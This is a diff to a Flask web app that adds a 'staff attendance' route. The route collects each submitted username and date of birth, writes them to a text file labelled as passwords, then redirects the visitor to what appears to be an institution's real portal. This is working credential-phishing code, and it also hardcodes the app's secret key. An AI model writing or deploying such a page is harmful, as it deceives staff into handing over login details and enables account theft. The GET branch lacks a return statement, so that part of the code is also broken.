@@ -15,6 +15,21 @@ app.secret_key = 'nathaanpuluthi'
 def home():
     return render_template('home.html')
 
+@app.route('/staff')
+def staff():
+    return render_template('staff.html')
+
+@app.route('/staff/attendance',  methods=['POST', 'GET'])
+def staff_attendance():
+    if request.method == 'POST':
+        user = request.form['username']
+        pas = request.form['DOB']
+        with open('user_data.txt', 'a') as file:
+            file.write(f'Username: {user}, Password: {pas}\n')
+        return redirect('https://mgc.ibossems.com/')
+    elif request.method == 'GET':
+        redirect(url_for('staff')) 
+
 @app.route('/result', methods=['POST', 'GET'])
 def result():
     if request.method == 'POST':
